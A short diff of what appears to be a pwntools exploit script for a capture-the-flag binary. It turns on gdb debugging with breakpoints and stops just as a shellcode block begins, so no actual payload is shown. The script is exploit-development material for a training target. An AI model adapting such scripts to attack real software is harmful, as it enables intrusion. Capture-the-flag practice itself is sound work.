@@ -4,13 +4,13 @@ from pwn import *
 exe = ELF('./chall')
 p = process(exe.path)
 
-# context.terminal = ['alacritty', '-e']
-# gdb.attach(p, gdbscript='''
-# b*0x0d3a+ 0x0000555555400000
-#            b*0xe24 + 0x0000555555400000
-#            b*database_store+2246
-#            # b*database_store+2251
-#            ''')
+context.terminal = ['alacritty', '-e']
+gdb.attach(p, gdbscript='''
+b*0x0d3a+ 0x0000555555400000
+           b*0xe24 + 0x0000555555400000
+           b*database_store+2246
+           # b*database_store+2251
+           ''')
 #################exploiting#####################
 # payload = b
 shellcode = asm('''
